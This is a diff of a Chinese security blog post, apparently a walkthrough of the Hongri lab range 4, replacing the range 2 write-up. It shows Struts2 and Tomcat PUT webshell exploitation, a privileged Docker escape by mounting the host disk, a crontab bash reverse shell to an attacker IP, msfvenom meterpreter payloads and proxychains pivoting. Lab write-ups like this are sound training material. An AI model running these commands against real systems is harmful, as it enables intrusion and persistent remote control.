@@ -4,21 +4,22 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="红日靶场 2, marin的小窝">
-    <meta name="description" content="红日靶场 2靶场搭建需要先配置一个虚拟网卡 VMnet2​，网段是 10.10.10.0/24
+    <meta name="keywords" content="红日靶场 4, marin的小窝">
+    <meta name="description" content="红日靶场 4环境搭建web：
 
-然后配置靶机的网卡
-PC：
-
+win7：Dotest123DC
 
 DC：
 
+web 需要启动一下 docker
+sudo docker start ec 17 09 ad
 
-WEB：
 
+外网渗透信息收集扫网段获取 ip 地址
 
-这里要修改 NAT 的网段地址，我的 kali 上是 154
-在 windows 中">
+然后扫端口
+
+这里几">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -30,7 +31,7 @@ WEB：
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>红日靶场 2 | marin的小窝</title>
+    <title>红日靶场 4 | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -262,12 +263,12 @@ WEB：
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%ED%82%A4%ED%83%80%EA%B0%80%EC%99%80%20%EB%A7%88%EB%A6%B0_97880017.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/dauisgdascuigsgciua.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">红日靶场 2</h1>
+                    <h1 class="description center-align post-title">红日靶场 4</h1>
                 </div>
             </div>
         </div>
@@ -320,7 +321,7 @@ WEB：
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2026-03-20
+                    2026-03-23
                 </div>
                 
 
@@ -344,328 +345,198 @@ WEB：
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="红日靶场-2"><a href="#红日靶场-2" class="headerlink" title="红日靶场 2"></a>红日靶场 2</h1><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>需要先配置一个虚拟网卡 <code>VMnet2</code>​，网段是 <code>10.10.10.0/24</code></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312154105-scl9713.png" alt="image"></p>
-<p>然后配置靶机的网卡</p>
-<p>PC：</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312154814-7ec0ns7.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312161217-x5tj7xd.png" alt="image"></p>
+                <h1 id="红日靶场-4"><a href="#红日靶场-4" class="headerlink" title="红日靶场 4"></a>红日靶场 4</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>web：</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323190009-vchsh5k.png" alt="image"></p>
+<p>win7：Dotest123DC</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323190018-5hs0zgv.png" alt="image"></p>
 <p>DC：</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312154927-l8nzj6k.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312161144-8kegfja.png" alt="image"></p>
-<p>WEB：</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312155056-b0fbsw3.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312161627-ca2rbkl.png" alt="image"></p>
-<p>这里要修改 NAT 的网段地址，我的 kali 上是 154</p>
-<p>在 windows 中搜索 网络和共享中心，选择更改适配器设置</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312162341-c6ds0ce.png" alt="image"></p>
-<p>右键属性</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312162357-74s1c20.png" alt="image"></p>
-<p>选择 Internet 协议版本 4</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312162411-qcz25vn.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312162517-84cllva.png" alt="image"></p>
-<p>然后需要开启 WEB 服务，到 WEB 服务器，右键以管理员登录这三个文件</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312162828-ix2w1w2.png" alt="image"></p>
-<p>‍</p>
-<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312163852-o0c7ytg.png" alt="image"></p>
-<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>这里目录没有扫描到东西，这个 301 也是空的</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312163902-bb7o5hc.png" alt="image"></p>
-<p>‍</p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>感觉端口扫描可能东西多一点</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312164436-6vceu4b.png" alt="image"></p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-03-12 16:34 CST
-Nmap scan report for 192.168.154.80
-Host is up (0.00089s latency).
-Not shown: 991 closed tcp ports (reset)
-PORT      STATE SERVICE
-80&#x2F;tcp    open  http
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-title: Site doesn&#39;t have a title.
-135&#x2F;tcp   open  msrpc
-139&#x2F;tcp   open  netbios-ssn
-445&#x2F;tcp   open  microsoft-ds
-1433&#x2F;tcp  open  ms-sql-s
-| ms-sql-info:
-|   192.168.154.80:1433:
-|     Version:
-|       name: Microsoft SQL Server 2008 R2 SP2
-|       number: 10.50.4000.00
-|       Product: Microsoft SQL Server 2008 R2
-|       Service pack level: SP2
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-|_ssl-date: 2026-03-12T08:35:37+00:00; 0s from scanner time.
-| ms-sql-ntlm-info:
-|   192.168.154.80:1433:
-|     Target_Name: DE1AY
-|     NetBIOS_Domain_Name: DE1AY
-|     NetBIOS_Computer_Name: WEB
-|     DNS_Domain_Name: de1ay.com
-|     DNS_Computer_Name: WEB.de1ay.com
-|     DNS_Tree_Name: de1ay.com
-|_    Product_Version: 6.1.7601
-| ssl-cert: Subject: commonName&#x3D;SSL_Self_Signed_Fallback
-| Not valid before: 2026-03-12T08:02:49
-|_Not valid after:  2056-03-12T08:02:49
-7001&#x2F;tcp  open  afs3-callback
-|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)
-49152&#x2F;tcp open  unknown
-49153&#x2F;tcp open  unknown
-49154&#x2F;tcp open  unknown
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323190026-zavy818.png" alt="image"></p>
+<p>web 需要启动一下 docker</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo docker start ec 17 09 ad</code></pre>
 
-Host script results:
-| smb-os-discovery:
-|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
-|   OS CPE: cpe:&#x2F;o:microsoft:windows_server_2008::sp1
-|   Computer name: WEB
-|   NetBIOS computer name: WEB\x00
-|   Domain name: de1ay.com
-|   Forest name: de1ay.com
-|   FQDN: WEB.de1ay.com
-|_  System time: 2026-03-12T16:34:27+08:00
-| smb2-time:
-|   date: 2026-03-12T08:34:27
-|_  start_date: 2026-03-12T08:03:16
-|_nbstat: NetBIOS name: WEB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:52:fa:49 (VMware)
-| smb2-security-mode:
-|   2:1:0:
-|_    Message signing enabled but not required
-|_clock-skew: mean: -1h36m00s, deviation: 3h34m39s, median: -1s
-| smb-security-mode:
-|   account_used: &lt;blank&gt;
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323194524-kf64rys.png" alt="image"></p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫网段获取 ip 地址</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323200507-07ybxb8.png" alt="image"></p>
+<p>然后扫端口</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323201024-od1q8tw.png" alt="image"></p>
+<p>这里几个端口都挺少见的</p>
+<p>2001 是一个文件上传</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323200704-ir2dk6r.png" alt="image"></p>
+<p>2002 是 Apache 中间件的页面</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323200728-ck0v9c9.png" alt="image"></p>
+<p>2003 是 phpMyadmin 的页面</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323200747-ipq8pni.png" alt="image"></p>
+<h3 id="初始访问"><a href="#初始访问" class="headerlink" title="初始访问"></a>初始访问</h3><h4 id="2001-端口"><a href="#2001-端口" class="headerlink" title="2001 端口"></a>2001 端口</h4><p>这里 nmap 扫描出来是 Struts2，网页也显示是这个框架，尝试使用工具一把梭，成功了，有好多个漏洞（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323201354-5asg38w.png" alt="image"></p>
+<p>成功 getshell 了，不过这里是在 docker 环境里面，不像正常的服务</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323201422-vwnsgyb.png" alt="image"></p>
+<p>接下来要尝试容器逃逸</p>
+<h5 id="容器逃逸（失败）"><a href="#容器逃逸（失败）" class="headerlink" title="容器逃逸（失败）"></a>容器逃逸（失败）</h5><p>先收集信息</p>
+<p>查看 IP 地址，发现不是 192 的 IP，又验证了是容器</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325124404-mm9kvt4.png" alt="image"></p>
+<p>查看提权信息，但是这里没有这个命令</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">capsh --print</code></pre>
 
-Nmap done: 1 IP address (1 host up) scanned in 75.90 seconds</code></pre>
+<p>查看挂载情况，看看有没有敏感信息</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cat &#x2F;proc&#x2F;self&#x2F;mounts</code></pre>
 
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323201916-cm4o2et.png" alt="image"></p>
+<p>查看系统版本，这里的 linux 版本有点低</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">uname -a</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260323202050-75zeqia.png" alt="image"></p>
+<p>查看特权模式，如果容器是以 <code>--privileged</code> 启动时，docker 会赋予主机级权限，可以读写所有设备文件并挂载宿主机磁盘</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cat &#x2F;proc&#x2F;self&#x2F;status | grep CapEff</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325124654-y8qwnfg.png" alt="image"></p>
+<p>然后用命令查看这个具体有什么特权，这里没有特权，只能尝试使用一些组件漏洞</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">capsh --decode&#x3D;00000000a80425fb</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325124916-99aww2x.png" alt="image"></p>
+<p>尝试使用 msf 上线，会更好操作一些</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.154.130 LPORT&#x3D;4444 -f elf -o shell.elf</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325133411-tmdurqu.png" alt="image"></p>
+<p>msf 启动监听，执行文件后成功获得 meterpreter</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">use exploit&#x2F;multi&#x2F;handler
+set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 192.168.154.130
+set LPORT 4444</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325133741-ep1we9w.png" alt="image"></p>
+<p>主动识别可用模块，但是这里把服务扫爆了（</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester
+set SESSION 1</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325134146-7tgi77x.png" alt="image"></p>
+<p>这里针对容器逃逸的好像就一个 <code>exploit/linux/local/docker_cgroup_escape</code>，但是也是需要特权的，没有成功</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325134650-sq12hvw.png" alt="image"></p>
 <p>‍</p>
-<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>‍</p>
-<h4 id="永恒之蓝（失败）"><a href="#永恒之蓝（失败）" class="headerlink" title="永恒之蓝（失败）"></a>永恒之蓝（失败）</h4><p>这里开了 445 和 139 端口，看看有没有永恒之蓝</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312165233-1rrzn8u.png" alt="image"></p>
-<p>这里检测是有的，但是好像是打不通的</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312165412-0x92j0d.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312165857-gkm1dfo.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312165909-pdk9l8p.png" alt="image"></p>
+<h4 id="2002-端口"><a href="#2002-端口" class="headerlink" title="2002 端口"></a>2002 端口</h4><p>这里是一个 Apache Tomcat 的服务，版本是 <code>8.5.19</code> 搜索到有一个文件上传漏洞，这里后台有限制</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325160546-s2bbc8o.png" alt="image"></p>
+<p>直接用 burp 抓包，然后将请求方法修改为 PUT，成功上传文件，测试直接上传 jsp shell</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325160726-c6jfm7i.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325164002-qlc9vde.png" alt="image"></p>
+<p>直接上传 jsp 会被 waf，绕过方法是使用 <code>/</code>，直接上 webshell</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325160933-ca5pr8p.png" alt="image"></p>
+<p>成功 getshell</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325164217-5alh7ly.png" alt="image"></p>
+<h5 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h5><p>这个容器可以看到有特权，这里有 <code>cap_sys_admin</code> 这个主要的特权</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325164353-ywywl70.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325164504-stjiq7s.png" alt="image"></p>
+<p>可以将宿主机的物理硬盘挂载到容器里，随意篡改，先查看容器中也没有宿主机的磁盘，这里确实有 <code>/dev/sda1</code>​，也有可能是 <code>/dev/vda1</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">fdisk -l
+lsblk</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325164837-0gr6p91.png" alt="image"></p>
+<p>直接挂载这个磁盘，这里就可以修改宿主机的文件了，直接写 ssh 公钥</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mkdir -p &#x2F;mnt&#x2F;host
+mount &#x2F;dev&#x2F;sda1 &#x2F;mnt&#x2F;host</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325165021-cgl22vn.png" alt="image"></p>
+<h6 id="ssh-（失败）"><a href="#ssh-（失败）" class="headerlink" title="ssh （失败）"></a>ssh （失败）</h6><p>创建 ssh 密钥，复制这个公钥文件</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ssh-keygen -t rsa -b 4096 -f pentest_key -N &quot;&quot;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325165618-oizybwt.png" alt="image"></p>
+<p>先在目标中创建一个 <code>.ssh</code> 目录并给权限</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325165854-79l9g7g.png" alt="image"></p>
+<p>然后将刚才的公钥命名为 <code>authorized_keys</code> 上传，还需要赋予命令</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">chmod 600 &#x2F;mnt&#x2F;host&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</code></pre>
+
+<p>然后直接连接，但是这里没成功，应该是配置不允许，需要修改配置</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash"># 允许 root 登录
+sed -i &#39;s&#x2F;.*PermitRootLogin.*&#x2F;PermitRootLogin yes&#x2F;g&#39; &#x2F;mnt&#x2F;host&#x2F;etc&#x2F;ssh&#x2F;sshd_config
+
+# 允许公钥认证
+sed -i &#39;s&#x2F;.*PubkeyAuthentication.*&#x2F;PubkeyAuthentication yes&#x2F;g&#39; &#x2F;mnt&#x2F;host&#x2F;etc&#x2F;ssh&#x2F;sshd_config</code></pre>
+
+<p>但是这个需要重启，这里没有成功重启，于是失败</p>
+<h6 id="chroot（成功一半）"><a href="#chroot（成功一半）" class="headerlink" title="chroot（成功一半）"></a>chroot（成功一半）</h6><p>这个使用冰蝎的 shell 不成功，尝试 msf 上去行不行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325172708-ev5ftaj.png" alt="image"></p>
+<p>成功了，容器逃逸，但是这里测试了一下，只是把物理磁盘逃逸出来了，查看 ip 还是 docker 中的 IP</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">chroot &#x2F;mnt&#x2F;host &#x2F;bin&#x2F;bash</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325174102-zxxn4mz.png" alt="image"></p>
+<h6 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h6><p>写计划任务来反弹 shell，成功</p>
 <blockquote>
-<p>这里后面发现应该是 360 干的（</p>
+<p>这里不知道为什么前面 ssh 的重启写计划任务一直没有成功，可能就是不能用公钥连接把（</p>
 </blockquote>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.154.130&#x2F;6666 0&gt;&amp;1&quot; &gt; &#x2F;mnt&#x2F;host&#x2F;1.sh
+echo &quot;* * * * * root bash &#x2F;1.sh&quot; &gt;&gt; &#x2F;mnt&#x2F;host&#x2F;etc&#x2F;crontab</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325175910-6gtm2i9.png" alt="image"></p>
 <p>‍</p>
-<h4 id="MSSQL（失败）"><a href="#MSSQL（失败）" class="headerlink" title="MSSQL（失败）"></a>MSSQL（失败）</h4><p>然后看看这里还有一个 mssql 能不能打，没有用户名和密码，应该也是不行</p>
-<h4 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h4><p>这里还有一个 7001 端口，是 WebLogic 的端口，版本是 <code>Oracle WebLogic Server 10.3.6.0</code>，有东西就可以扫描了</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312170748-y1kceng.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312172349-8kegb2k.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312172718-kqjaz2p.png" alt="image"></p>
-<p>这个版本应该是存在漏洞的，利用工具试一下，存在漏洞</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312183402-k6sb4qg.png" alt="image"></p>
-<p>看看能不能注入内存马，这里发现用这个漏洞注入不进去内存马，换了一个漏洞</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312184341-g2dd167.png" alt="image"></p>
-<p>这个漏洞注入的冰蝎内存马是可以连接的，但是蚁剑不行不知道为什么</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312184620-xw6y7w5.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312184627-ozrvxjl.png" alt="image"></p>
-<p>后来突然想起来，只能命令执行的话可以直接上 vshell 了，成功上线了</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312184741-krqe0q1.png" alt="image"></p>
+<h4 id="2003-端口"><a href="#2003-端口" class="headerlink" title="2003 端口"></a>2003 端口</h4><p>‍</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h3><p>这里要需要隧道代理出来，还是使用 msf 再次上线</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325180836-o8vz632.png" alt="image"></p>
+<p>然后就是配置代理</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">run autoroute -s 192.168.52.0&#x2F;24
+run autoroute -p</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325181111-plzz1ln.png" alt="image"></p>
 <p>‍</p>
-<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>能上传文件了，可以上 CS 了，这个还是好用一点，不过文件上传上去好像不成功，应该是被 360 给防护了</p>
-<p>查看当前所有进程，这里看到几个进程，应该是 360 的杀软</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">tasklist &#x2F;svc
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>这里可以发现内网的网段 <code>192.168.52.0/24</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325180100-qmoo97v.png" alt="image"></p>
+<p>然后扫内网，这个只扫描到了 <code>195.168.52.130</code>，这里应该还有一个 IP，发现是这个服务器的配置有问题，没有打开，其实应该是能扫到，这里就不重新扫了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">proxychains4 nmap -Pn -sT -p 445,135,80 --open 192.168.52.0&#x2F;24</code></pre>
 
-C:\Windows\Temp&gt;tasklist &#x2F;svc
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325185813-9gnktlv.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325191156-p34eglb.png" alt="image"></p>
+<blockquote>
+<p>学到一个，这个很快</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">proxychains4 fping -aqg 192.168.52.0&#x2F;24</code></pre>
 
-映像名称                       PID 服务
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-System Idle Process              0 暂缺
-System                           4 暂缺
-smss.exe                       256 暂缺
-csrss.exe                      344 暂缺
-wininit.exe                    396 暂缺
-csrss.exe                      408 暂缺
-winlogon.exe                   444 暂缺
-services.exe                   500 暂缺
-lsass.exe                      516 Netlogon, SamSs
-lsm.exe                        524 暂缺
-svchost.exe                    612 DcomLaunch, PlugPlay, Power
-vmacthlp.exe                   672 VMware Physical Disk Helper Service
-svchost.exe                    708 RpcEptMapper, RpcSs
-svchost.exe                    788 Dhcp, eventlog, lmhosts
-svchost.exe                    856 AeLookupSvc, BITS, CertPropSvc, gpsvc,
-                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,
-                                   Schedule, SENS, SessionEnv,
-                                   ShellHWDetection, Winmgmt, wuauserv
-svchost.exe                    912 EventSystem, netprofm, nsi, sppuinotify,
-                                   W32Time, WinHttpAutoProxySvc
-svchost.exe                    956 Netman, TrkWks, UmRdpService, UxSms
-ZhuDongFangYu.exe             1012 ZhuDongFangYu
-svchost.exe                    356 CryptSvc, Dnscache, LanmanWorkstation,
-                                   NlaSvc
-svchost.exe                    732 BFE, DPS, MpsSvc
-spoolsv.exe                   1232 Spooler
-svchost.exe                   1264 AppHostSvc
-sqlservr.exe                  1392 MSSQL$SQLEXPRESS
-SMSvcHost.exe                 1412 NetPipeActivator, NetTcpActivator,
-                                   NetTcpPortSharing
-ReportingServicesService.     1560 ReportServer$SQLEXPRESS
-sqlwriter.exe                 1880 SQLWriter
-VGAuthService.exe             1904 VGAuthService
-vmtoolsd.exe                  1948 VMTools
-svchost.exe                   1972 W3SVC, WAS
-fdlauncher.exe                2128 MSSQLFDLauncher$SQLEXPRESS
-svchost.exe                   2168 TermService
-WmiPrvSE.exe                  2204 暂缺
-svchost.exe                   2252 PolicyAgent
-fdhost.exe                    2400 暂缺
-conhost.exe                   2408 暂缺
-dllhost.exe                   2472 COMSysApp
-msdtc.exe                     2560 MSDTC
-sppsvc.exe                     844 sppsvc
-taskhost.exe                  2896 暂缺
-dwm.exe                       1240 暂缺
-explorer.exe                  2364 暂缺
-vmtoolsd.exe                   908 暂缺
-360Tray.exe                   2868 暂缺
-SoftMgrLite.exe               3624 暂缺
-cmd.exe                       1848 暂缺
-conhost.exe                   4008 暂缺
-java.exe                      3776 暂缺
-cmd.exe                       3924 暂缺
-conhost.exe                    604 暂缺
-ebda8925tcp.exe               4144 暂缺
-winpty-agent.exe              4520 暂缺
-conhost.exe                   4480 暂缺
-cmd.exe                       4116 暂缺
-1.exe                         2740 暂缺
-1.exe                         4300 暂缺
-1.exe                         5096 暂缺
-1.exe                         3588 暂缺
-360Safe.exe                   4024 暂缺
-360leakfixer.exe               940 暂缺
-tasklist.exe                  3876 暂缺</code></pre>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325193208-5usfbhy.png" alt="image"></p>
+</blockquote>
+<p>然后重新扫描常用端口</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">proxychains nmap -sV -T4 192.168.52.130</code></pre>
 
-<p>后来研究了半天，不知道为什么上线不了 CS，上靶机看了一眼发现是这个程序不知道为什么运行不了，会自动停止，好像也不是 360 的问题</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312191355-twd8ig5.png" alt="image"></p>
-<p>不知道为什么，先用 vshell 打了，好像依旧可以用土豆家族打</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">C:\Users\Administrator\Desktop&gt;whoami &#x2F;priv
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325195212-j0azdg2.png" alt="image"></p>
